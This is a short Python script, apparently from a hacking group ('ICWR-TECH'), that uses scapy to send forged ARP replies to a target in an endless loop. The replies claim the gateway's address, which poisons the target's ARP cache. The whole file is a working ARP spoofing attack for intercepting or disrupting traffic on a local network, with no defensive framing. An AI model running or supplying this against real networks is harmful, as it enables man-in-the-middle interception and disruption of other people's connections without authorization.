#!/usr/bin/python
# Coded By Afrizal F.A - ICWR-TECH
import sys, subprocess
from scapy.all import *

reply=1
iface=sys.argv[1]
target=sys.argv[2]
route=sys.argv[3]

arp=ARP(op=reply,psrc=route,pdst=target)

while True :
    send(arp)
